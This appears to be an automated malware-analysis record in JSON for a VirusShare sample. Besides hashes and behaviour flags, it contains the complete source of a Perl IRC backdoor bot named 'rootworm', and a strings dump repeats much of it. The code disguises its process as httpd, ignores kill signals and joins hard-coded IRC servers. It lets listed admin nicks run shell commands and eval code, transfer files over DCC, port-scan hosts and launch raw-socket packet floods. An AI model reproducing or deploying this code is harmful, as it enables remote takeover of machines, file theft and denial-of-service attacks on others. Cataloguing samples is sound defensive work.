{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "open": "May open a file",
            "shell": "May run an executable file or a system command"
        },
        "macro": "#!/usr/bin/perl\nmy $processo = '/usr/sbin/httpd --DSSL';\nmy $linas_max='10';\nmy $sleep='3';\nmy @adms=(\"\\x50\\x75\\x79\\x61\\x38\\x32\",\"\\x46\\x69\\x72\\x65\\x6D\\x61\\x6E\",\"\\x55\\x6C\\x61\\x74\\x75\",);\nmy @canais=(\"#\\xBC\\xBD\\xBE :lametrapchan\",\"#\\xBC\\xBD\\xBE :lametrapchan\");\nmy $nick= \"\\x62\\x6F\\x75\";\nmy $ircname = \"\\x66\\x6C\\x6F\\x6F\\x64\";\nchop (my $realname = `uname -r`);\n$servidor='eu.undernet.org';\n$servidor='us.undernet.org';\n$servidor='195.204.1.130';\n$servidor='194.109.20.90'\nunless $servidor;\nmy $porta='6667';\nmy $secv = 1;\nmy $VERSAO = '1.0';\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Problem with fork: $!\" unless defined($pid);\nour %irc_servers;\nour %DCC;\nmy $dcc_sel = new IO::Select->new();\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n  } else {\n      print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\nsub conectar {\n   my $meunick = $_[0];\n   my $servidor_con = $_[1];\n   my $porta_con = $_[2];\n   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);\n   if (defined($IRC_socket)) {\n     $IRC_cur_socket = $IRC_socket;\n     $IRC_socket->autoflush(1);\n     $sel_cliente->add($IRC_socket);\n     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n     nick(\"$meunick\");\n     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n     sleep 1;\n   }\n}\nmy $line_temp;\nwhile( 1 ) {\n   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n   delete($irc_servers{''}) if (defined($irc_servers{''}));\n   &DCC::connections;\n   my @ready = $sel_cliente->can_read(0);\n   next unless(@ready);\n   foreach $fh (@ready) {\n     $IRC_cur_socket = $fh;\n     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n     $nread = sysread($fh, $msg, 4096);\n     if ($nread == 0) {\n        $sel_cliente->remove($fh);\n        $fh->close;\n        delete($irc_servers{$fh});\n     }\n     @lines = split (/\\n/, $msg);\n     for(my $c=0; $c<= $#lines; $c++) {\n       $line = $lines[$c];\n       $line=$line_temp.$line if ($line_temp);\n       $line_temp='';\n       $line =~ s/\\r$//;\n       unless ($c == $#lines) {\n         parse(\"$line\");\n       } else {\n           if ($#lines == 0) {\n             parse(\"$line\");\n           } elsif ($lines[$c] =~ /\\r$/) {\n               parse(\"$line\");\n           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n               parse(\"$line\");\n           } else {\n               $line_temp = $line;\n           }\n       }\n      }\n   }\n}\nsub parse {\n   my $servarg = shift;\n   if ($servarg =~ /^PING \\:(.*)/) {\n     sendraw(\"PONG :$1\");\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n       my $pn=$1; my $onde = $4; my $args = $5;\n       if ($args =~ /^\\001VERSION\\001$/) {\n         notice(\"$pn\", \"\\001VERSION rootworm-$VERSAO in perl \\001\");\n       }\n       if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {\n         if ($onde eq \"$meunick\"){\n           shell(\"$pn\", \"$args\");\n         }\n         if ($args =~ /^(\\Q$meunick\\E|\\!cmd)\\s+(.*)/ ) {\n            my $natrix = $1;\n            my $arg = $2;\n            if ($arg =~ /^\\!(.*)/) {\n              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!cmd\" and $arg =~ /^\\!nick/);\n            } elsif ($arg =~ /^\\@(.*)/) {\n                $ondep = $onde;\n                $ondep = $pn if $onde eq $meunick;\n                bfunc(\"$ondep\",\"$1\");\n            } else {\n                shell(\"$onde\", \"$arg\");\n            }\n         } \n       }\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\n       if (lc($1) eq lc($meunick)) {\n         $meunick=$4; \n         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       }\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\n       nick(\"$meunick\".int rand(9999));\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n       $meunick = $2;\n       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\n       foreach my $canal (@canais) {\n         sendraw(\"JOIN $canal\");\n       }\n   }\n}\nsub bfunc {\n  my $printl = $_[0];\n  my $funcarg = $_[1];\n  if (my $pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           if ($funcarg =~ /^portscan (.*)/) {\n             my $hostip=\"$1\";\n             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");\n             my (@aberta, %porta_banner);\n             foreach my $porta (@portas)  {\n                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n                if ($scansock) {\n                   push (@aberta, $porta);\n                   $scansock->close;\n                }\n             }\n             if (@aberta) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :portas abertas: @aberta\");\n             } else {\n                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :no open doors found\"); \n             }\n           }\n           if ($funcarg =~ /^pacota\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");\n             $dtime = 1 if $dtime == 0;\n             my %bytes;\n             $bytes{igmp} = $2 * $pacotes{igmp};\n             $bytes{icmp} = $2 * $pacotes{icmp};\n             $bytes{o} = $2 * $pacotes{o};\n             $bytes{udp} = $2 * $pacotes{udp};\n             $bytes{tcp} = $2 * $pacotes{tcp};\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status GERAL -\\002\");\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo\\002: $dtime\".\"s\");\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total pacotes\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002M\u5daeia de envio\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");\n           }\n           exit;\n       }\n  }\n}\nsub ircase {\n  my ($kem, $printl, $case) = @_;\n  if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   } \n   if ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\n   if ($case =~ /^rejoin\\s+(.*)/) {\n      my $chan = $1;\n      if ($chan =~ /^(\\d+) (.*)/) {\n        for (my $ca = 1; $ca <= $1; $ca++ ) {\n          p(\"$2\");\n          j(\"$2\");\n        }\n      } else {\n          p(\"$chan\");\n          j(\"$chan\");\n      }\n   }\n   if ($case =~ /^op/) {\n      op(\"$printl\", \"$kem\") if $case eq \"op\";\n      my $oarg = substr($case, 3);\n      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^deop/) {\n      deop(\"$printl\", \"$kem\") if $case eq \"deop\";\n      my $oarg = substr($case, 5);\n      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^voice/) {\n      voice(\"$printl\", \"$kem\") if $case eq \"voice\";\n      $oarg = substr($case, 6);\n      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^devoice/) {\n      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";\n      $oarg = substr($case, 8);\n      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^msg\\s+(\\S+) (.*)/) {\n      msg(\"$1\", \"$2\");\n   }\n   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        msg(\"$2\", \"$3\");\n      }\n   }\n   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\n      ctcp(\"$1\", \"$2\");\n   }\n   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        ctcp(\"$2\", \"$3\");\n      }\n   }\n   if ($case =~ /^invite\\s+(\\S+) (.*)/) {\n      invite(\"$1\", \"$2\");\n   }\n   if ($case =~ /^nick (.*)/) {\n      nick(\"$1\");\n   }\n   if ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {\n       conectar(\"$2\", \"$1\", 6667);\n   }\n   if ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {\n      DCC::SEND(\"$1\", \"$2\");\n   }\n   if ($case =~ /^raw (.*)/) {\n      sendraw(\"$1\");\n   }\n   if ($case =~ /^eval (.*)/) {\n     eval \"$1\";\n   }\n}\nsub shell {\n  return unless $secv;\n  my $printl=$_[0];\n  my $comando=$_[1];\n  if ($comando =~ /cd (.*)/) {\n    chdir(\"$1\") || msg(\"$printl\", \"Dir doesnt exist!\");\n    return;\n  } \n  elsif ($pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           my @resp=`$comando 2>&1 3>&1`;\n           my $c=0;\n           foreach my $linha (@resp) {\n             $c++;\n             chop $linha;\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n             if ($c == \"$linas_max\") {\n               $c=0;\n               sleep $sleep;\n             }\n           }\n           exit;\n       }\n  }\n}\nsub attacker {\n  my $iaddr = inet_aton($_[0]);\n  my $msg = 'B' x $_[1];\n  my $ftime = $_[2];\n  my $cp = 0;\n  my (%pacotes);\n  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\n  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\n  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\n  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\n  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\n  return(undef) if $cp == 4;\n  my $itime = time;\n  my ($cur_time);\n  while ( 1 ) {\n     for (my $porta = 1; $porta <= 65535; $porta++) {\n       $cur_time = time - $itime;\n       last if $cur_time >= $ftime;\n       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;\n       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;\n       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;\n       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;\n       for (my $pc = 3; $pc <= 255;$pc++) {\n         next if $pc == 6;\n         $cur_time = time - $itime;\n         last if $cur_time >= $ftime;\n         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\n         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;;\n       }\n     }\n     last if $cur_time >= $ftime;\n  }\n  return($cur_time, %pacotes);\n}\nsub action {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");\n}\n\nsub ctcp {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\nsub msg {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :$_[1]\");\n}  \n\nsub notice {\n   return unless $#_ == 1;\n   sendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +o $_[1]\");\n}\nsub deop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -o $_[1]\");\n}\nsub hop {\n    return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub dehop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub voice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +v $_[1]\");\n}\nsub devoice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -v $_[1]\");\n}\nsub ban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +b $_[1]\");\n}\nsub unban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -b $_[1]\");\n}\nsub kick {\n   return unless $#_ == 1;\n   sendraw(\"KICK $_[0] $_[1] :$_[2]\");\n}\n\nsub modo {\n   return unless $#_ == 0;\n   sendraw(\"MODE $_[0] $_[1]\");\n}\nsub mode { modo(@_); }\n\nsub j { &join(@_); }\nsub join {\n   return unless $#_ == 0;\n   sendraw(\"JOIN $_[0]\");\n}\nsub p { part(@_); }\nsub part {sendraw(\"PART $_[0]\");}\n\nsub nick {\n  return unless $#_ == 0;\n  sendraw(\"NICK $_[0]\");\n}\n\nsub invite {\n   return unless $#_ == 1;\n   sendraw(\"INVITE $_[1] $_[0]\");\n}\nsub topico {\n   return unless $#_ == 1;\n   sendraw(\"TOPIC $_[0] $_[1]\");\n}\nsub topic { topico(@_); }\n\nsub whois {\n  return unless $#_ == 0;\n  sendraw(\"WHOIS $_[0]\");\n}\nsub who {\n  return unless $#_ == 0;\n  sendraw(\"WHO $_[0]\");\n}\nsub names {\n  return unless $#_ == 0;\n  sendraw(\"NAMES $_[0]\");\n}\nsub away {\n  sendraw(\"AWAY $_[0]\");\n}\nsub back { away(); }\nsub quit {\n  sendraw(\"QUIT :$_[0]\");\n}\npackage DCC;\nsub connections {\n   my @ready = $dcc_sel->can_read(1);\n   foreach my $fh (@ready) {\n     my $dcctipo = $DCC{$fh}{tipo};\n     my $arquivo = $DCC{$fh}{arquivo};\n     my $bytes = $DCC{$fh}{bytes};\n     my $cur_byte = $DCC{$fh}{curbyte};\n     my $nick = $DCC{$fh}{nick};\n     my $msg;\n     my $nread = sysread($fh, $msg, 10240);\n     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {\n        $DCC{$fh}{status} = \"Cancelado\";\n        $DCC{$fh}{ftime} = time;\n        $dcc_sel->remove($fh);\n        $fh->close;\n        next;\n     }\n     if ($dcctipo eq \"get\") {\n        $DCC{$fh}{curbyte} += length($msg);\n        my $cur_byte = $DCC{$fh}{curbyte};\n        open(FILE, \">> $arquivo\");\n        print FILE \"$msg\" if ($cur_byte <= $bytes);\n        close(FILE);\n        my $packbyte = pack(\"N\", $cur_byte);\n        print $fh \"$packbyte\";\n        if ($bytes == $cur_byte) {\n           $dcc_sel->remove($fh);\n           $fh->close;\n           $DCC{$fh}{status} = \"Recived\";\n           $DCC{$fh}{ftime} = time;\n           next;\n        }\n     } elsif ($dcctipo eq \"send\") {\n          my $send = $fh->accept;\n          $send->autoflush(1);\n          $dcc_sel->add($send);\n          $dcc_sel->remove($fh);\n          $DCC{$send}{tipo} = 'sendcon';\n          $DCC{$send}{itime} = time;\n          $DCC{$send}{nick} = $nick;\n          $DCC{$send}{bytes} = $bytes;\n          $DCC{$send}{curbyte} = 0;\n          $DCC{$send}{arquivo} = $arquivo;\n          $DCC{$send}{ip} = $send->peerhost;\n          $DCC{$send}{porta} = $send->peerport;\n          $DCC{$send}{status} = \"Enviando\";\n          open(FILE, \"< $arquivo\");\n          my $fbytes;\n          read(FILE, $fbytes, 1024);\n          print $send \"$fbytes\";\n          close FILE;\n     } elsif ($dcctipo eq 'sendcon') {\n          my $bytes_sended = unpack(\"N\", $msg);\n          $DCC{$fh}{curbyte} = $bytes_sended;\n          if ($bytes_sended == $bytes) {\n             $fh->close;\n             $dcc_sel->remove($fh);\n             $DCC{$fh}{status} = \"Enviado\";\n             $DCC{$fh}{ftime} = time;\n             next;\n          }\n          open(SENDFILE, \"< $arquivo\");\n          seek(SENDFILE, $bytes_sended, 0);\n          my $send_bytes;\n          read(SENDFILE, $send_bytes, 1024);\n          print $fh \"$send_bytes\";\n          close(SENDFILE);\n     }\n   }\n}\nsub SEND {\n  my ($nick, $arquivo) = @_;\n  unless (-r \"$arquivo\") {\n    return(0);\n  }\n  my $dccark = $arquivo;\n  $dccark =~ s/[.*\\/](\\S+)/$1/;\n  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};\n  my $longip = unpack(\"N\",inet_aton($meuip));\n  my @filestat = stat($arquivo);\n  my $size_total=$filestat[7];\n  if ($size_total == 0) {\n     return(0);\n  }\n  my ($porta, $sendsock);\n  do {\n    $porta = int rand(64511);\n    $porta += 1024;\n    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);\n  } until $sendsock;\n  $DCC{$sendsock}{tipo} = 'send';\n  $DCC{$sendsock}{nick} = $nick;\n  $DCC{$sendsock}{bytes} = $size_total;\n  $DCC{$sendsock}{arquivo} = $arquivo;\n  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");\n}\nsub GET {\n  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;\n  return(0) if (-e \"$arquivo\");\n  if (open(FILE, \"> $arquivo\")) {\n     close FILE;\n  } else { \n    return(0); \n  }\n  my $dccip=fixaddr($dcclongip);\n  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);\n  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);\n  $dccsock->autoflush(1);\n  $dcc_sel->add($dccsock);\n  $DCC{$dccsock}{tipo} = 'get';\n  $DCC{$dccsock}{itime} = time;\n  $DCC{$dccsock}{nick} = $nick;\n  $DCC{$dccsock}{bytes} = $bytes;\n  $DCC{$dccsock}{curbyte} = 0;\n  $DCC{$dccsock}{arquivo} = $arquivo;\n  $DCC{$dccsock}{ip} = $dccip;\n  $DCC{$dccsock}{porta} = $dccporta;\n  $DCC{$dccsock}{status} = \"Recebendo\";\n}\nsub Status {\n  my $socket = shift;\n  my $sock_tipo = $DCC{$socket}{tipo};\n  unless (lc($sock_tipo) eq \"chat\") {\n    my $nick = $DCC{$socket}{nick};\n    my $arquivo = $DCC{$socket}{arquivo};\n    my $itime = $DCC{$socket}{itime};\n    my $ftime = time;\n    my $status = $DCC{$socket}{status};\n    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});\n    my $d_time = $ftime-$itime;\n    my $cur_byte = $DCC{$socket}{curbyte};\n    my $bytes_total =  $DCC{$socket}{bytes};\n    my $rate = 0;\n    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;\n    my $porcen = ($cur_byte*100)/$bytes_total;\n    my ($r_duv, $p_duv);\n    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $r_duv = $3; $r_duv++ if $4 >= 5;\n       $rate = \"$1\\.$2\".\"$r_duv\";\n    }\n    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $p_duv = $3; $p_duv++ if $4 >= 5;\n       $porcen = \"$1\\.$2\".\"$p_duv\";\n    }\n    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");\n  }\n  return(0);\n}\nsub fixaddr {\n    my ($address) = @_;\n    chomp $address;\n    if ($address =~ /^\\d+$/) {\n        return inet_ntoa(pack \"N\", $address);\n    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {\n        return $address;\n    } elsif ($address =~ tr/a-zA-Z//) {\n        return inet_ntoa(((gethostbyname($address))[4])[0]);\n    } else {\n        return;\n    }\n}\n\n"
    },
    "filename": "VirusShare_84bf79ad8c7f37f8ed88c799201e8586",
    "filesize": 17349,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "84bf79ad8c7f37f8ed88c799201e8586",
        "sha1": "7e85fe70d16975de17e604d6b449306b1d0113a1",
        "sha256": "686e5b224691194a7f3bb26b879acc1f477bc9db5632c1cfe921d171f03aaa88"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "my $processo = '/usr/sbin/httpd --DSSL';",
            "my $linas_max='10';",
            "my $sleep='3';",
            "my @adms=(\"\\x50\\x75\\x79\\x61\\x38\\x32\",\"\\x46\\x69\\x72\\x65\\x6D\\x61\\x6E\",\"\\x55\\x6C\\x61\\x74\\x75\",);",
            "my @canais=(\"#\\xBC\\xBD\\xBE :lametrapchan\",\"#\\xBC\\xBD\\xBE :lametrapchan\");",
            "my $nick= \"\\x62\\x6F\\x75\";",
            "my $ircname = \"\\x66\\x6C\\x6F\\x6F\\x64\";",
            "chop (my $realname = `uname -r`);",
            "$servidor='eu.undernet.org';",
            "$servidor='us.undernet.org';",
            "$servidor='195.204.1.130';",
            "$servidor='194.109.20.90'",
            "unless $servidor;",
            "my $porta='6667';",
            "my $secv = 1;",
            "my $VERSAO = '1.0';",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Problem with fork: $!\" unless defined($pid);",
            "our %irc_servers;",
            "our %DCC;",
            "my $dcc_sel = new IO::Select->new();",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "  if ($#_ == '1') {",
            "    my $socket = $_[0];",
            "    print $socket \"$_[1]\\n\";",
            "  } else {",
            "      print $IRC_cur_socket \"$_[0]\\n\";",
            "sub conectar {",
            "   my $meunick = $_[0];",
            "   my $servidor_con = $_[1];",
            "   my $porta_con = $_[2];",
            "   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);",
            "   if (defined($IRC_socket)) {",
            "     $IRC_cur_socket = $IRC_socket;",
            "     $IRC_socket->autoflush(1);",
            "     $sel_cliente->add($IRC_socket);",
            "     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "     nick(\"$meunick\");",
            "     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "     sleep 1;",
            "   }",
            "my $line_temp;",
            "while( 1 ) {",
            "   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
            "   delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "   &DCC::connections;",
            "   my @ready = $sel_cliente->can_read(0);",
            "   next unless(@ready);",
            "   foreach $fh (@ready) {",
            "     $IRC_cur_socket = $fh;",
            "     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "     $nread = sysread($fh, $msg, 4096);",
            "     if ($nread == 0) {",
            "        $sel_cliente->remove($fh);",
            "        $fh->close;",
            "        delete($irc_servers{$fh});",
            "     }",
            "     @lines = split (/\\n/, $msg);",
            "     for(my $c=0; $c<= $#lines; $c++) {",
            "       $line = $lines[$c];",
            "       $line=$line_temp.$line if ($line_temp);",
            "       $line_temp='';",
            "       $line =~ s/\\r$//;",
            "       unless ($c == $#lines) {",
            "         parse(\"$line\");",
            "       } else {",
            "           if ($#lines == 0) {",
            "             parse(\"$line\");",
            "           } elsif ($lines[$c] =~ /\\r$/) {",
            "               parse(\"$line\");",
            "           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "               parse(\"$line\");",
            "           } else {",
            "               $line_temp = $line;",
            "           }",
            "       }",
            "      }",
            "   }",
            "sub parse {",
            "   my $servarg = shift;",
            "   if ($servarg =~ /^PING \\:(.*)/) {",
            "     sendraw(\"PONG :$1\");",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "       my $pn=$1; my $onde = $4; my $args = $5;",
            "       if ($args =~ /^\\001VERSION\\001$/) {",
            "         notice(\"$pn\", \"\\001VERSION rootworm-$VERSAO in perl \\001\");",
            "       }",
            "       if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {",
            "         if ($onde eq \"$meunick\"){",
            "           shell(\"$pn\", \"$args\");",
            "         }",
            "         if ($args =~ /^(\\Q$meunick\\E|\\!cmd)\\s+(.*)/ ) {",
            "            my $natrix = $1;",
            "            my $arg = $2;",
            "            if ($arg =~ /^\\!(.*)/) {",
            "              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!cmd\" and $arg =~ /^\\!nick/);",
            "            } elsif ($arg =~ /^\\@(.*)/) {",
            "                $ondep = $onde;",
            "                $ondep = $pn if $onde eq $meunick;",
            "                bfunc(\"$ondep\",\"$1\");",
            "            } else {",
            "                shell(\"$onde\", \"$arg\");",
            "            }",
            "         } ",
            "       }",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "       if (lc($1) eq lc($meunick)) {",
            "         $meunick=$4; ",
            "         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       }",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "       nick(\"$meunick\".int rand(9999));",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "       $meunick = $2;",
            "       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "       foreach my $canal (@canais) {",
            "         sendraw(\"JOIN $canal\");",
            "       }",
            "   }",
            "sub bfunc {",
            "  my $printl = $_[0];",
            "  my $funcarg = $_[1];",
            "  if (my $pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           if ($funcarg =~ /^portscan (.*)/) {",
            "             my $hostip=\"$1\";",
            "             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");",
            "             my (@aberta, %porta_banner);",
            "             foreach my $porta (@portas)  {",
            "                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);",
            "                if ($scansock) {",
            "                   push (@aberta, $porta);",
            "                   $scansock->close;",
            "                }",
            "             }",
            "             if (@aberta) {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :portas abertas: @aberta\");",
            "             } else {",
            "                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :no open doors found\"); ",
            "             }",
            "           }",
            "           if ($funcarg =~ /^pacota\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");",
            "             $dtime = 1 if $dtime == 0;",
            "             my %bytes;",
            "             $bytes{igmp} = $2 * $pacotes{igmp};",
            "             $bytes{icmp} = $2 * $pacotes{icmp};",
            "             $bytes{o} = $2 * $pacotes{o};",
            "             $bytes{udp} = $2 * $pacotes{udp};",
            "             $bytes{tcp} = $2 * $pacotes{tcp};",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status GERAL -\\002\");",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo\\002: $dtime\".\"s\");",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total pacotes\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));",
